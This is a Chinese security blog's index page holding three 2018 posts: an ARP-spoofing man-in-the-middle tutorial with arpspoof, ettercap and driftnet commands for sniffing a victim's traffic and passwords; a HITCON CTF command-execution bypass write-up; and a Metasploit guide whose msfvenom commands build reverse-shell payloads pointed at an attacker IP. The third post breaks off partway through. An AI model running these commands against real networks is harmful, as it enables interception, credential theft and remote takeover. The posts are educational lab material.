<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <title>
        
            Hpdoger
        
    </title>
    <link rel="icon" href="/img/favicon.png">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <link rel="stylesheet" href="/css/hljs.min.css">
    <script src="/js/hljs.min.js"></script>  
    <script src="/js/gitment.browser.js"></script>  
</head>
<body>
    <header class="header" id="header">
    <h1>
        <a class="title" href="/">
            Hpdoger
        </a>
    </h1>
    <h2>
        <a class="motto">
            Finance behind Passion in Security
        </a>
    </h2>
    <nav class="navbar">
        <ul class="menu">
            
            
                <li class="menu-item">
                    <a href="/" class="menu-item-link">
                        Home
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/archives/" class="menu-item-link">
                        Archives
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/about/" class="menu-item-link">
                        About
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/friends/" class="menu-item-link">
                        Friends
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
                        Github
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/atom.xml" class="menu-item-link">
                        RSS
                    </a>
                </li>
            
                
            
                
                
        </ul>
    </nav>
</header>
    <main class="main">
        <section class="posts">
    
        <article class="post">
            <h1>
                <a class="title" href="/2018/07/17/浅谈Arp攻击和利用Arp欺骗进行MITM/"> 
                    浅谈Arp攻击和利用Arp欺骗进行MITM 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-07-17   
                </a>
                
                <a class="category">
                    <i class="fa fa-th" aria-hidden="true"></i>  
                </a>
               
                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a></li></ul>
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/无线安全/">无线安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
            </div>
            <div class="content">
                
                <p>原文已投稿安全客，转载自安全客：<br><a href="https://www.anquanke.com/post/id/151762" target="_blank" rel="noopener">浅谈Arp攻击和利用Arp欺骗进行MITM</a></p>
<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>arp欺骗也是很古老的渗透手段了，主要起着信息收集的作用，比如你可以利用欺骗获取对方的流量，从流量分析你认为重要的信息，例如某某账号密码。或是利用Arp攻击，切断局域网内某一用户的网络访问（单向欺骗）。下面着重讲一下中间人攻击的原理，配和实战演练分析，不对的地方，还请大家多多反馈和包涵！</p>
<h2 id="MITM"><a href="#MITM" class="headerlink" title="MITM"></a>MITM</h2><p><strong>借用Wiki百科的一个比喻来理解MITM（中间人攻击）：</strong></p>
<p>假设爱丽丝（Alice）希望与鲍伯（Bob）通信。同时，马洛里（Mallory）希望拦截窃会话以进行窃听并可能在某些时候传送给鲍伯一个虚假的消息。</p>
<ol>
<li><p>首先，爱丽丝会向鲍勃索取他的公钥。如果Bob将他的公钥发送给Alice，并且此时马洛里能够拦截到这个公钥，就可以实施中间人攻击。马洛里发送给爱丽丝一个伪造的消息，声称自己是鲍伯，并且附上了马洛里自己的公钥（而不是鲍伯的）。</p>
</li>
<li><p>爱丽丝收到公钥后相信这个公钥是鲍伯的，于是爱丽丝将她的消息用马洛里的公钥（爱丽丝以为是鲍伯的）加密，并将加密后的消息回给鲍伯。马洛里再次截获爱丽丝回给鲍伯的消息，并使用马洛里自己的私钥对消息进行解密，如果马洛里愿意，她也可以对消息进行修改，然后马洛里使用鲍伯原先发给爱丽丝的公钥对消息再次加密。当鲍伯收到新加密后的消息时，他会相信这是从爱丽丝那里发来的消息。</p>
</li>
</ol>
<p>我们的身份就是Mallory，我们希望欺骗Alice和Bob，让其认为我们是交互的正确目标，从而来获取他们之间交流的信息。</p>
<h2 id="Arp攻击分析"><a href="#Arp攻击分析" class="headerlink" title="Arp攻击分析"></a>Arp攻击分析</h2><p>想要进行中间人攻击，先理解最基础的arp攻击</p>
<h3 id="Arp协议"><a href="#Arp协议" class="headerlink" title="Arp协议"></a>Arp协议</h3><p>ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。</p>
<p>以太网（局域网）进行信息传输时，不是根据IP地址进行通信，因为IP地址是可变的，用于通信是不安全的。然而MAC地址是网卡的硬件地址，一般出厂后就具有唯一性。ARP协议就是将目标IP地址解析成MAC地址进行验证通信。</p>
<h3 id="Arp通信过程"><a href="#Arp通信过程" class="headerlink" title="Arp通信过程"></a>Arp通信过程</h3><ol>
<li><p>每台主机都会在自己的ARP缓冲区建立一个ARP列表（生命周期二十分钟），用于表示IP地址和MAC地址的对应关系。</p>
</li>
<li><p>主机A若想和主机B通信，首先主机A会查询Arp缓存表（后面称ip-mac缓存表）是否有B主机对应的ip-mac，有的话就将B主机的mac地址封装到数据包发送。若没有的话，主机A会向以太网发送一个Arp广播包，告诉以太网内的所有主机自己的ip-mac，并请求B主机（以ip来表示B主机）的mac地址。当B主机收到Arp广播包后，确认A主机是想找自己的mac地址，就会对A主机进行回应一个自己的mac地址。A主机就会更新自己的ip-mac缓存表，同时B主机也会接收A主机的ip-mac对应关系到自己的ip-mac缓存表。</p>
</li>
</ol>
<h3 id="Arp协议缺陷"><a href="#Arp协议缺陷" class="headerlink" title="Arp协议缺陷"></a>Arp协议缺陷</h3><p>ARP协议信任以太网所有的节点，效率高但是不安全。这份协议没有其它字协议来保证以太网内部信息传输的安全，它不会检查自己是否接受或发送过请求包，只要它就收到的arp广播包，他就会把对应的ip-mac更新到自己的缓存表</p>
<h3 id="网关的理解"><a href="#网关的理解" class="headerlink" title="网关的理解"></a>网关的理解</h3><p>在wiki中这样定义网关：</p>
<p>在计算机网络中，网关（英语：Gateway）是转发其他服务器通信数据的服务器，接收从客户端发送来的请求时，它就像自己拥有资源的源服务器一样对请求进行处理。有时客户端可能都不会察觉，自己的通信目标是一个网关</p>
<p>区别于路由器（由于历史的原因，许多有关TCP/IP的文献曾经把网络层使用的路由器（英语：Router）称为网关，在今天很多局域网采用都是路由来接入网络，因此现在通常指的网关就是路由器的IP），经常在家庭中或者小型企业网络中使用，用于连接局域网和Internet。</p>
<p>网关也经常指把一种协议转成另一种协议的设备，比如语音网关。</p>
<p>网关可以把内网ip转化为外网ip，从而向服务器发出请求。也可以把外网Ip获得的数据包转换成内网ip发给内网主机。</p>
<h3 id="Arp攻击原理"><a href="#Arp攻击原理" class="headerlink" title="Arp攻击原理"></a>Arp攻击原理</h3><p>根据以上说的arp协议缺陷，如果我们冒充网关主机C，不停的向以太网发送自己的ARP广播包，告知自己的ip-mac，此时其它主机就会被欺骗，更新我们C的ip-mac为网关主机的ip-mac，那么其它主机的数据包就会发送到C主机上，因为没有发给真正的网关，就会造成其它主机的网络中断。</p>
<h2 id="Arp攻击实操"><a href="#Arp攻击实操" class="headerlink" title="Arp攻击实操"></a>Arp攻击实操</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>攻击主机A：Kali–&gt;ip: 192.168.11.106<br>被攻击主机B： windows 7–&gt;ip: 192.168.11.105<br>网关主机C： 192.168.11.1</p>
<p>我的Kali是在虚拟机下，需要Bridge连接保证机器在同一网段，很多人用Nat连接来转发，在实战的轻快下，需要更改虚拟机的网络配置。</p>
<p>网络配置如图:<br><img src="https://p5.ssl.qhimg.com/t010ded0516622b1c75.png" alt></p>
<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>这里模拟真实环境，攻击主机A和被攻击主机B在同一局域网下。</p>
<ol>
<li>先用命令查看一下ip是否正确：<br>Kali：<br><img src="https://p5.ssl.qhimg.com/t01140b6dbaec16750c.jpg" alt><br>可以看到ip是192.168.11.106,网卡信息是:<br>Windows7：<br><img src="https://p5.ssl.qhimg.com/t01676bafc8546dc6d5.png" alt></li>
<li>用nmap查看当前网端的活跃主机</li>
</ol>
<p><strong>nmap命令</strong></p>
<pre><code>nmap -sF 192.168.11.0/24</code></pre><p><img src="https://p3.ssl.qhimg.com/t01160b3ef83d34572e.jpg" alt><br>得到如图活跃主机，可以看到我们的主机B。当然获取Ip的途径不可能这么简单，你也可以用fping的方法来分析，之前我用fping探测局域网windows10的主机，发现Ping不通，win10防火墙还是有点东西。不过你可以根据fping的发送包来推断主机是否真正存活，具体可以google一下fping的用法，这里给推荐一个链接</p>
<p><a href="https://www.cnblogs.com/dunitian/p/5074783.html" target="_blank" rel="noopener">Kali信息收集：Fping</a></p>
<ol start="3">
<li>检查被攻击主机是否可以正常上网<br><img src="https://p4.ssl.qhimg.com/t010225c59bde160166.png" alt><br>百度正常访问</li>
</ol>
<ol start="4">
<li>利用Arpspoof进行欺骗攻击<br>Kali自带的Arpspoof可以很好的进行欺骗，man arpspoof查看官网手册（网上翻译）：<pre><code>名字 
 arpspoof # 截获交换局域网中的数据包
</code></pre></li>
</ol>
<p>用法<br>    arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</p>
<p>描述<br>    # arpspoof通过伪造的ARP响应包改变局域网中从目标主机（或所有主机）到另一个主机（host）的数据包转发路径。这是交换局域网中嗅探网络流量的一种极为有效的方法。内核IP转发（或如fragrouter这样的、用户层面的、能完成同样功能的软件）必须提前开启。</p>
<p>参数<br>    -i interface<br>        # 指定要使用的接口（即指定一块网卡）<br><br>    -c own|host|both<br>        # 指定在恢复ARP配置时使用的硬件地址；当在清理（cleaning up）时，数据包的源地址可以用自己的也可以用主机（host）的硬件地址。使用伪造的硬件地址可能导致某些配置下的交换网络、AP网络或桥接网络通信中断，然而它比起默认值————使用自己的硬件地址要工作地更为可靠。<br><br>    -t target<br>        # 指定一个特殊的、将被ARP毒化的主机（如果没有指定，则认为是局域网中所有主机）。重复可以指定多个主机。<br><br>    -r<br>        # 毒化两个主机（目标和主机（host））以捕获两个方向的网络流量。（仅仅在和-t参数一起使用时有效）<br><br>    host   #你想要截获数据包的主机 (通常是网关)。</p>
<pre><code>
5. 作为网关欺骗
命令语句</code></pre><p>arpspoof -i eth0 -t 192.168.11.105 192.168.1.1</p>
<pre><code>![](https://p3.ssl.qhimg.com/t01364b901401aae698.jpg)
执行命令，Kali会向主机B发送ARP响应包，响应包的内容是Kali的ip-mac地址，而响应包里的ip则是网关主机ip地址。每一行代表一个响应包。从左到右：自己Kali的mac、主机B的mac、帧类型码(0806，代表ARP包)、包大小、包内容。

6. 被攻击主机B网络中断
![](https://p1.ssl.qhimg.com/t0178e6ea7a6cacc21f.png)
在kali终端输入control + c 可以停止，然后主机重新恢复正常联网状态

## 基于Arp攻击理解下的MITM
在前面Arp成功进行攻击后，我们开始作为中间人进行欺骗，需要设置ip转发，获取目标主机B的流量，其后配合其它工具(drifnet)等进行进一步嗅探。

值得一提的是，我们的Arp攻击也是欺骗，但它是单向欺骗，冒充网关主机来欺骗目标主机。实际中，中间人攻击一般是双向欺骗。即作为中间人，主机A双向欺骗主机B与C获得通信内容，但是不破坏通信数据的传输。为了不影响B与C传输的数据丢失，主机A开启ip转发，开启后来自B主机的数据包经过A主机的Kali后转发给主机C。欺骗两个主机B和C后，我们就能嗅探到双向数据包。

如果你的kali在虚拟机，那么以下步骤均需要一个外置的usb无线网卡。在虚拟机中，网络的连接比较复杂，而Ip转发很大程度上取决于网卡性能。如果你是在虚拟机中Kali进行转发，基本都会失败，因为笔记本的内置无限网卡满足不了需求。由于放假在家我的usb无线网卡落在了寝室..下面仅以文字给大家介绍攻击的思路和流程，还请见谅.......
### linux的ip转发
linux因为系统安全，是不支持IP转发的，其配置文件写在/proc/sys/net/ipv4的ip_forward中。默认为0，需要修改为1。

开启方法大致有两种：
1. 只接进入文件修改</code></pre><p>cd /proc/sys/net/ipv4<br>ls<br>cat ip_forward</p>
<p>#显示结果为0<br>echo 1 &gt; ip_forward<br>cat ip_forward</p>
<p>#显示结果为1，修改成功</p>
<pre><code>2. 使用echo</code></pre><h1 id="echo-“1”-gt-proc-sys-net-ipv4-ip-forward"><a href="#echo-“1”-gt-proc-sys-net-ipv4-ip-forward" class="headerlink" title="echo  “1”&gt; /proc/sys/net/ipv4/ip_forward"></a>echo  “1”&gt; /proc/sys/net/ipv4/ip_forward</h1><pre><code>
### 对网关和目标主机B的双向欺骗
这里进行一步执行，选用第二种Ip转发手段
命令如下：</code></pre><p>root@kali:~# echo 1 &gt; /proc/sys/net/ipv4/ip_forward &amp;&amp; arpspoof -i eth0 -t 192.168.11.105 -r 192.168.11.1</p>
<pre><code>
### 利用driftnet进程监控
持续保持欺骗，再重新打开一个命令终端。
输入命令：</code></pre><p>root@kali:~# driftnet -i eth0</p>
<pre><code>跳出来的drift窗口即会显示本机正在浏览的图片

### 使用ettercap工具获取密码
1. 打开新的终端，输入 attercap -G 启动工具
2. 点击Sniff -&gt; unified sniffing，选择要抓包的网卡，默认是自己的网卡eth0，点确定
3. 然后单击Hosts -&gt; Scan for host，待扫描完成后再次Scan for host，此时可以看到ettercap-NG已经扫描的主机列表
4. 选择攻击目标，点击192.168.11.105的ip地址，点击Add to Target 1 ，然后选择网关的ip地址192.168.11.1，点击Add to Target 2
5. 明确目标攻击方式：点击Mitm -&gt; arp poisoning -&gt; Sniff remote connections -&gt; 确定
6. 开始监听：start -&gt; Start sniffing 

工具就会抓取主机B的数据包和主机C返回的数据包,分析http post请求可以判断账号密码信息。

### urlsnarf：获得受害者的HTTP请求
输入命令：</code></pre><p>root@kali:~# urlsnarf -i eth0<br>```</p>
<h3 id="使用Wireshark抓包"><a href="#使用Wireshark抓包" class="headerlink" title="使用Wireshark抓包"></a>使用Wireshark抓包</h3><p>使用Wireshark抓取所有的数据包，过滤分析不同请求，类似于ettercap。<br>例如，要找HTTP POST请求，过滤，查看明文密码，一般是以POST形式上传的账号密码。</p>
<h2 id="关于Arp欺骗的防御"><a href="#关于Arp欺骗的防御" class="headerlink" title="关于Arp欺骗的防御"></a>关于Arp欺骗的防御</h2><p><img src="https://p4.ssl.qhimg.com/t019370399a03c046c4.png" alt><br>防御原理很简单，就是不让攻击者肆意表明自己就是网关主机。我们进入网关主机（路由器后台地址），网络参数一栏一般有ip与mac绑定一栏，把网关的mac地址与网关地址绑定就好了。只要确定了对应关系，当攻击者发布arp相应包时，就不会更新相应的ip-mac缓存表。如果想知道对方主机的ip地址其实也容易。我们在Cmd下键入命令<code>arp -a</code>看一下相同mac，就找到了攻击者。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>公共区域的wifi存在钓鱼风险</li>
<li>在传输数据过程中尽量使用加密程序</li>
</ul>
<p>一提的是，我们从始至终双向欺骗的是网关主机</p>
<p>### </p>

                
            </div>
            <div class="continue">
            <a href="/2018/07/17/浅谈Arp攻击和利用Arp欺骗进行MITM/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/07/14/HITCON CTF命令执行绕过/"> 
                    HITCON CTF命令执行绕过 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-07-14   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <p>#HITCON CTF命令执行绕过</p>
<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近开始暑假生活，基本上是吃喝玩乐。但是过两天还有一场peakgeek，不想让自己松懈，学习一道命令执行的题目，由于没有自己的服务器来搭小马，我就大致在自己的linux进行绕过操作，才发现自己linux命令学的狗屁不是，构造能力也特别垃圾</p>
<h2 id="BabayFirst"><a href="#BabayFirst" class="headerlink" title="BabayFirst"></a>BabayFirst</h2><p>题目给的源码</p>
<pre><code>&lt;?php
    $sandbox = &#39;/www/sandbox/&#39; . md5(&quot;orange&quot; . $_SERVER[&#39;REMOTE_ADDR&#39;]);
    @mkdir($sandbox);
    @chdir($sandbox);
    if (isset($_GET[&#39;cmd&#39;]) &amp;&amp; strlen($_GET[&#39;cmd&#39;]) &lt;= 5) {
        @exec($_GET[&#39;cmd&#39;]);
    } else if (isset($_GET[&#39;reset&#39;])) {
        @exec(&#39;/bin/rm -rf &#39; . $sandbox);
    }
    highlight_file(__FILE__);</code></pre><h2 id="linux写文件命令"><a href="#linux写文件命令" class="headerlink" title="linux写文件命令"></a>linux写文件命令</h2><p>题目大致意思是给每个人创建一个不同的目录，然后你在当前目录下进行命令执行。</p>
<p>命令的长度不能超过5<br>这里有一篇文章:<br><a href="http://wonderkun.cc/index.html/?p=524" target="_blank" rel="noopener"> 从七个字符长度的任意命令执行到GetShell</a></p>
<p>文章讲了一种方法，通过<code>&gt;</code>命令建立空文件，再用<code>ls -t&gt;</code>把当前目录的<strong>文件名</strong>当作<strong>文件内容</strong>导入到一个<strong>新的文件</strong>中。<strong>新的文件</strong>中也包含当前文件名，内容按照ascii码表排序换行。</p>
<p>linux还有一个小技巧，<code>\</code>可以对命令进行换行，是命令的拼接操作，具体如下<br><img src="https://s1.ax1x.com/2018/07/14/PMwdcq.png" alt></p>
<p>先看一下它是如何Work的：<br><img src="https://s1.ax1x.com/2018/07/14/PMwwj0.png" alt></p>
<p>这里我们用<code>ls</code>语句把当前文件夹下的文件名写成一个新文件叫做<strong>down</strong>，可以看到我们用<code>&gt;</code>来创建空文件，文件名包含反斜杠<code>\</code>，这样我们执行sh的时候就可以拼接命令。从图也可以看到，遇到错误命令会报错，但是不会终止，依旧输出了1。也就是”echo 1”</p>
<p>值得注意的是，若文件名有反斜杠，则要用<code>\\</code>来写，还有空格、&gt;要用<code>\</code>、<code>\&gt;</code>来写，用转义符。</p>
<p>根据图片的ls可以看到，我们的文件名是按ascii码表排的，生成文件的话命令是杂乱的，也是无效的。所以我们用<code>ls -t&gt;</code>按照时间顺序来写入文件。</p>
<p>但是这题有长度限制, ls -t&gt;已经超过5个字符。<br>网上思路是把ls -t&gt;也写成一个文件，用sh执行，那么就需要构造这个文件了。<br>构造思路纠结了我很久，后来看到一种巧妙的方法，借助<code>&gt;&gt;</code>来文件追加<br>写文件过程:</p>
<pre><code>&gt;l\\
&gt;s \\
&gt;-t\\
&gt;\&gt;g</code></pre><p>接着执行ls&gt;a，得到a中文件内容应该是这样的：</p>
<pre><code>&#39;-t\&#39;
&#39;&gt;g&#39;
&#39;a&#39;
&#39;l\&#39;
&#39;s \&#39;</code></pre><p>如果我们追加<code>ls&gt;&gt;a</code>则内容应该是这样的：</p>
<pre><code>&#39;-t\&#39;
&#39;&gt;g&#39;
&#39;a&#39;
&#39;l\&#39;
&#39;s \&#39;
&#39;-t\&#39;
&#39;&gt;g&#39;
&#39;a&#39;
&#39;l\&#39;
&#39;s \&#39;</code></pre><p>前三行和后三行命令无效，只有中间部分的命令有效。所以a文件的可执行内容就只是:ls -t&gt;g</p>
<p>接着还要构造curl请求来下载一个小马。这点还没有学会，以后再记</p>
<h2 id="用echo和-gt-gt-追加命令写shell"><a href="#用echo和-gt-gt-追加命令写shell" class="headerlink" title="用echo和&gt;&gt;追加命令写shell"></a>用echo和&gt;&gt;追加命令写shell</h2><p>这个是偶然看到郁离歌的博客里写的，对长度限制不是那么严格的时候可以用。<br><img src="https://s1.ax1x.com/2018/07/14/PMwc4J.png" alt></p>
<p>但是看到别人博客写，有时候这样php文件不能执行，原因就在于换行。最好可以把POST[]写到一行。所以这个方法不是很好，大多数是用wget或者curl下载小马，但是我还没学会</p>
<p>相关链接：<br><a href="http://www.freebuf.com/articles/web/137923.html" target="_blank" rel="noopener">浅谈CTF中命令执行与绕过的小技巧</a></p>

                
            </div>
            <div class="continue">
            <a href="/2018/07/14/HITCON CTF命令执行绕过/">
            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/07/09/内网穿透进行Metasploit渗透/"> 
                    内网穿透进行Metasploit渗透 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-07-09   
                </a>
                
                <a class="category">
                    <i class="fa fa-th" aria-hidden="true"></i>  
                </a>
               
                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a></li></ul>
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Metasploit/">Metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透/">渗透</a></li></ul>
            </div>
            <div class="content">
                
                <h2 id="初识Metasploit"><a href="#初识Metasploit" class="headerlink" title="初识Metasploit"></a>初识Metasploit</h2><p>Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，是一个框架，常用于内网渗透。</p>
<p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpretershell的链接。Meterpretershell作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。另外Meterpreter能够躲避入侵检测系统。在远程主机上隐藏自己,它不改变系统硬盘中的文件,因此HIDS[基于主机的入侵检测系统]很难对它做出响应。此外它在运行的时候系统时间是变化的,所以跟踪它或者终止它对于一个有经验的人也会变得非常困难。最后,Meterpreter还可以简化任务创建多个会话。可以来利用这些会话进行渗透。 </p>
<h2 id="Meterpreter中常用的Shell"><a href="#Meterpreter中常用的Shell" class="headerlink" title="Meterpreter中常用的Shell"></a>Meterpreter中常用的Shell</h2><h3 id="reverse-tcp"><a href="#reverse-tcp" class="headerlink" title="reverse_tcp"></a>reverse_tcp</h3><p>这是一个基于TCP的反向shell</p>
<h3 id="reverse-http"><a href="#reverse-http" class="headerlink" title="reverse_http"></a>reverse_http</h3><p>基于http方式的反向连接，在网速慢的情况下不稳定</p>
<h3 id="reverse-https"><a href="#reverse-https" class="headerlink" title="reverse_https"></a>reverse_https</h3><p>基于https方式的反向连接，在网速慢的情况下不稳定。</p>
<h3 id="bind-tcp"><a href="#bind-tcp" class="headerlink" title="bind_tcp"></a>bind_tcp</h3><p>这是一个基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST。</p>
<h2 id="payload选择的三大要素如下："><a href="#payload选择的三大要素如下：" class="headerlink" title="payload选择的三大要素如下："></a>payload选择的三大要素如下：</h2><ul>
<li>木马连接的方向</li>
<li>目标操作系统及版本</li>
<li>反弹的shell类型</li>
</ul>
<p>木马连接方向：<br>msf木马分为正向连接与反向连接，正向连接适合攻击机能给连接目标机的情况，反向连接使用目标机能连接攻击机的情况，这里所说的连接一般是指tcp的某个端口。因此在生成木马前，需要先判断当前环境，适合正向连接木马还是反向连接的木马。（可以使用nc工具测试）</p>
<p>操作系统位数查看：</p>
<pre><code>getconf LONG_BIT</code></pre><h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><p>linux相关payload：</p>
<pre><code>1 linux/x86/meterpreter/reverse_tcp
2 linux/x86/meterpreter/bind_tcp
3 linux/x86/shell_bind_tcp
4 linux/x86/shell_reverse_tcp
5 linux/x64/shell_reverse_tcp
6 linux/x64/shell_bind_tcp</code></pre><p>windows相关payload:</p>
<pre><code>1 windows/meterpreter/reverse_tcp
2 windows/meterpreter/bind_tcp
3 windows/shell_reverse_tcp
4 windows/shell_bind_tcp
5 windows/x64/meterpreter/reverse_tcp
6 windows/x64/meterpreter/bind_tcp
7 windows/x64/shell_reverse_tcp
8 windows/x64/shell_bind_tcp</code></pre><p>payload具体参数含义:</p>
<pre><code>-p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)
-l, --list       [module_type]   列出指定模块的所有可用资源,模块类型包括: payloads, encoders, nops, all
-n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度
-f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
-e, --encoder    [encoder]       指定需要使用的encoder（编码器）
-a, --arch       &lt;architecture&gt;  指定payload的目标架构
    --platform   &lt;platform&gt;      指定payload的目标平台
-s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度
-b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;
-i, --iterations &lt;count&gt;         指定payload的编码次数
-c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件
-x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板
-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
    --payload-options            列举payload的标准选项
-o, --out   &lt;path&gt;               保存payload
-v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式
    --shellest                   最小化生成payload
-h, --help                       查看帮助选项
    --help-formats               查看msf支持的输出格式列表</code></pre><p>一个典型的msfvenom使用举例如下：</p>
<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker&#39;s IP] lport=7777 -f exe -o /tmp/my_payload.exe</code></pre><h2 id="自己的看法"><a href="#自己的看法" class="headerlink" title="自己的看法"></a>自己的看法</h2><p>最近真的好忙…然后又在这里胡乱研究Metasploit，感觉后天实验班考核要凉凉…<br>背景：我有一台Kali的虚拟机，一台外网vps，想要渗透一台win7的虚拟机。目前还没有学到提权，只是会用msf生成反弹马，然后msf监听外网vps接收的数据。win7我虚拟机开了Nat进行转发，传上去了小马，菜刀连接上。</p>
<p>因为我是内网的Kali，所以要进行内网穿透：<br>内网穿透，即NAT穿透，网络连接时术语，计算机是局域网内时，外网与内网的计算机节点需要连接通信，有时就会出现不支持内网穿透，就是说映射端口，能让外网的电脑找到处于内网的电脑，提高下载速度。不管是内网穿透还是其他类型的网络穿透，都是网络穿透的统一方法来研究和解决。</p>
<p>首先我们为什么要内网穿透？因为我们的kali在内网，当木鸡（简称）执行我们msf生成的EXE木马时，它会把自己的Shell反弹出去，当然这个Shell不可能反弹到我们自己的内网。那么我们就需要有个外网的ip来监听这个Shell。当然，我们也可以用自己的外网ip来映射到kali上。但是一方面我觉得不安全，另一方面我觉得windows限制太多了，所以就利用我有的一台Centos7的VPS来当作这个跳板。时间不多了，开始记录一下目前的步骤：</p>
<h2 id="获取meterpreter会话"><a href="#获取meterpreter会话" class="headerlink" title="获取meterpreter会话"></a>获取meterpreter会话</h2><h3 id="VPS开启流量转发"><a href="#VPS开启流量转发" class="headerlink" title="VPS开启流量转发"></a>VPS开启流量转发</h3><p>在网上看到有人说用lcx作为内网端口转发的工具，但是centos7好像编译环境不允许lcx，使用不起。用Ssocks搭建隧道，监听两个端口，7777用来接收来自受害者反弹的shell，7778将7777的流量转发出。下载sSocks，执行命令编译<code>./configure &amp;&amp; make</code>,进入src文件夹</p>
<pre><code>./rcsocks -l 7777 -p 7778</code></pre><h2 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h2><h3 id="Kali生成Payload-in-Linux"><a href="#Kali生成Payload-in-Linux" class="headerlink" title="Kali生成Payload in Linux"></a>Kali生成Payload in Linux</h3><pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></pre><h3 id="Kali生成Payload-in-Windows"><a href="#Kali生成Payload-in-Windows" class="headerlink" title="Kali生成Payload in Windows"></a>Kali生成Payload in Windows</h3><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></pre><h3 id="Kali分步生成Payload"><a href="#Kali分步生成Payload" class="headerlink" title="Kali分步生成Payload"></a>Kali分步生成Payload</h3><p>分步执行：</p>
<pre><code>msf &gt; use payload/windows/meterpreter/reverse_tcp  #指定payload
msf &gt; payload(reverse_tcp) &gt; set lhost xxxxx(外网Ip) #设置监听地址
lhost =&gt; xxxxx(外网Ip) 
msf &gt; payload(reverse_tcp) &gt; set lport 7777(监听流量流入端口)
lport =&gt; 6666
msf &gt; payload(reverse_tcp) &gt; generate -b &#39;\x00\xff&#39; -t exe -e x86/shikata_ga_nai -i 5 -f /root/test.exe
[*] Writing 73802 bytes to /root/test.exe...</code></pre><h2 id="msf进行监听"><a href="#msf进行监听" class="headerlink" title="msf进行监听"></a>msf进行监听</h2><p>回到msf主界面：</p>
<pre><code>msf &gt; payload(reverse_tcp) &gt; back</code></pre><p>运行监听模块：</p>
<pre><code>msf &gt; use exploit/multi/handler</code></pre><p>设置接收的payload：</p>
<pre><code>msf exploit(handler) &gt; set payload windows/meterpreter/bind_tcp</code></pre><p>设置vps监听的地址和转发的端口：</p>
<pre><code>msf exploit(handler) &gt; set rhost xxxx(外网Ip)
rhost =&gt; xxxx(外网Ip)
